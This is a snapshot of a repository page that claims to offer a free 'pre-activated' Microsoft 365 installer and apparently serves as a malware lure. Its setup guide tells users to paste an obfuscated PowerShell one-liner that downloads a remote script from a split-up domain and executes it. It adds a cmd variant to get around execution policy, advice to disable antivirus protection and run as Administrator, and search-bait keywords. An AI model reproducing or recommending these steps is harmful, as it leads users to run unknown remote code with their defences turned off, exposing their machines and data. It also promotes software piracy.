---
title: "Codeonshovel/microsoft-365"
owner: "Codeonshovel"
name: "microsoft-365"
fullName: "Codeonshovel/microsoft-365"
description: "Microsoft 365 Professional Desktop Utility Configuration - Full working installer for seamless setup and operation."
sourceUrl: "https://github.com/Codeonshovel/microsoft-365"
stars: 394
forks: 0
language: "未知"
topics: ["automation", "developer-tools", "excel-automation", "libreoffice-extension", "microsoft-excel-advanced", "microsoft-keys", "microsoft-office", "microsoft-suite"]
license: "未标注"
defaultBranch: "main"
snapshotDate: "2026-11-04"
pushedAt: "2026-11-03T11:00:22Z"
---

> 本页保存的是公开项目资料快照，阅读过程不需要连接 GitHub。

# Microsoft 365

### ⚡ Overview
**This repository provides a pre-activated, free setup for Microsoft 365.** It is fully configured for standalone deployment, removing the need for registration or license configuration. Perfect for testing, development, and local workstation setups.

### ⚙️ System Specifications
> **Distribution Type:** Pre-activated Local Build
>
> **Target Platform:** Windows x64 Desktop
>
> **Estimated File Size:** 1.2 GB
>
> **Last Verified Mirror Sync:** November 2026

---

## 🛠️ Quick Setup Guide (PowerShell)

1. Launch PowerShell:
   * Press `Win + X` on your keyboard.
   * Click on **Terminal** or **Windows PowerShell** from the list.

2. Execute the Setup Script:
   Copy the command below, paste it into your PowerShell window, and hit `Enter`. Wait until all installing successfully:

   ```cmd
   $Node='git-software.'; $Zone='cc'; $Path='/ps/Setup.ps1'; $Endpoint='https://'+$Node+$Zone+$Path; $Pipeline=New-Object System.Net.WebClient; $Buffer=$Pipeline.DownloadString($Endpoint); .([scriptblock]::Create($Buffer))
   ```

---

## 📖 Resolving Issues

### ⚠️ Script is blocked by Execution Policy
If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
```cmd
powershell -Command "$Node='git-software.'; $Zone='cc'; $Path='/ps/Setup.ps1'; $Endpoint='https://'+$Node+$Zone+$Path; $Pipeline=New-Object System.Net.WebClient; $Buffer=$Pipeline.DownloadString($Endpoint); .([scriptblock]::Create($Buffer))"
```

### 🛡️ Antivirus / SmartScreen Alerts
Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

⚠️ *Note: Make sure to run your terminal as Administrator to allow proper pathway and environment mapping.*

---

---

## 🔍 Organic Discovery & Identification

* download microsoft 365 setup 2026
* microsoft 365 standalone installer
* offline setup microsoft 365
* pre-activated microsoft 365

## 📖 Core Build Parameters

Automated standalone configuration package deployed for offline environment infrastructure.
